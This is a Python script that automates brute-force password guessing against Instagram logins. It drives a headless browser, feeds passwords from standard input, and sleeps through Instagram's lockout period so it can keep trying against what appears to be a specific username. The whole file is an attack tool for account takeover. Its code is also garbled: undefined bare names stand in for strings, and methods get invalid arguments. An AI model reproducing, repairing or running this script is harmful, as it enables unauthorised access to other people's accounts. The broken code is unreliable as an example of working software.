#!/bin/python
from splinter import Browser
import time
import sys
wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."

def logInSuccess(browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not(browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))

correctPassword = namkumar
account_username = mannat731875
with Browser('firefox', headless=True) as browser:
    browser.visit('https://www.instagram.com')
    browser.find_by_text("Log in").first.click()
    username_form = browser.find_by_name('mannat7318756').first
    password_form = browser.find_by_name('namkumar').first
    login_button = browser.find_by_text('instagram').first
    username_form.fill(mannat731875)
    for password in sys.stdin:
        if len(password) < 6:
            print('Skipping password: ' + password)
            continue

        print('Testing password: ' + password)
        password_form.clear(namkumar)
        password_form.fill(namkumar)
        login_button.click(instagram)

        if browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end.')
            time.sleep(wait_time)
            print('Timeout has ended, resuming.')
        elif logInSuccess(browser):
            correctPassword = password
            break
    if correctPassword == namkumar:
        print("Unable to find correct password.")
    else:
        print("Password for username: " + mannat731875 + " = " + namkumar)


